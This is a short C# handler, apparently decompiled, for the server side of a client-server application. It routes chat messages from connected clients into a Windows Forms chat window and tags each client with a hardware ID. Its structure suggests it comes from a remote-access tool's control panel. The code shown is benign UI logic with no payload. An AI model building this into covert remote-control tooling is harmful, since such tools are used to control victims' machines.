using System.Windows.Forms;
using Server.Connectings;
using Server.Forms;

namespace Server.Messages;

internal class HandlerChat
{
	public static void Read(Clients client, object[] objects)
	{
		string text = (string)objects[1];
		if (!(text == "Connect"))
		{
			if (!(text == "Message"))
			{
				return;
			}
			if (client.Tag == null)
			{
				client.Disconnect();
				return;
			}
			FormChat form = (FormChat)client.Tag;
			form.Invoke((MethodInvoker)delegate
			{
				form.richTextBox1.Text += (string)objects[2];
				form.richTextBox1.SelectionStart = form.richTextBox1.Text.Length;
				form.richTextBox1.ScrollToCaret();
			});
			return;
		}
		FormChat form2 = (FormChat)Application.OpenForms["Chat:" + (string)objects[2]];
		if (form2 == null)
		{
			client.Disconnect();
			return;
		}
		form2.Invoke((MethodInvoker)delegate
		{
			form2.Text = "Chat [" + (string)objects[2] + "]";
			form2.client = client;
			form2.richTextBox1.Enabled = true;
			form2.rjTextBox1.Enabled = true;
		});
		client.Tag = form2;
		client.Hwid = (string)objects[2];
	}
}
